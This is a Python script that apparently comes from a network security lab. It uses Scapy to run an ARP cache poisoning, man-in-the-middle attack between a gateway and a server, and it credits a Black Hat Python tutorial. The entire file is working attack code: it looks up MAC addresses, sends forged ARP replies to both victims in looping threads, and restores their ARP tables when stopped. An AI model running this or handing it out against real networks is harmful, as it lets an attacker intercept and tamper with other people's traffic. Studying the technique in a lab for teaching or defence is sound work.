# For ARP table restauration and logical structure of the attack I was inspired by:
# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242 

from scapy.all import *
import time
import threading

midlle_IP = "198.7.0.3"
middle_MAC = ""
default_gateway_IP = "198.7.0.1"
default_gateway_MAC = ""
server_IP = "198.7.0.2"
server_MAC = ""
poisoning_is_running = True

def get_MAC_address(destination_IP):
    # send the initial request in order for the middle's ARP table
    # to learn the MAC addresses of the router and server

    # broadcast request from middle
    answer, _ = sr(ARP(op=1, pdst=destination_IP, hwdst="ff:ff:ff:ff:ff:ff"), timeout=5, verbose=0)
    
    # return as response the MAC destination address
    for _, response in answer:
        print("[*] Got IP mac address {} for IP address {}".format(response[ARP].hwsrc, destination_IP))
        return response[ARP].hwsrc

    return None

def ARP_restoring(destination_IP, destination_MAC, source_IP, source_MAC):
    # when the attack is finished, restore the ARP tables 
    print("[*] Restoring {}'s ARP table.".format(destination_IP))
    send(ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC), verbose=0)

def ARP_poisoning(destination_IP, destination_MAC, source_IP, source_MAC):
    global poisoning_is_running
    global middle_MAC
    print("[*] Started poisoning the ARP table for {}.".format(destination_IP))

    try:
        # continously send ARP responses to a victim in order
        # for its table to be falsely stored
        while poisoning_is_running:
            time.sleep(5)
            send(ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=middle_MAC), verbose=0)

        # it will exit the while when the poisoning stops, and then it will
        # return to the parent process
        exit(0)
    finally:
        # ARP table will be restored
        print("[!] Stopped poisoning {}'s ARP table.".format(destination_IP))
        ARP_restoring(destination_IP, destination_MAC, source_IP, source_MAC)

# initate ARP table for middle, router and server
default_gateway_MAC = get_MAC_address(default_gateway_IP)
server_MAC = get_MAC_address(server_IP)
middle_MAC = get_MAC_address(midlle_IP)

# create two separate threads for the ARP poisoning 
default_getaway_thread = threading.Thread(target=ARP_poisoning, args=(default_gateway_IP, default_gateway_MAC, server_IP, server_MAC))
default_getaway_thread.start()

server_thread = threading.Thread(target=ARP_poisoning, args=(server_IP, server_MAC, default_gateway_IP, default_gateway_MAC))
server_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Poisoning is stopping...")

    # stop the threads, ARP tables 
    # for router and server will be restored
    poisoning_is_running = False

    default_getaway_thread.join()    
    server_thread.join()
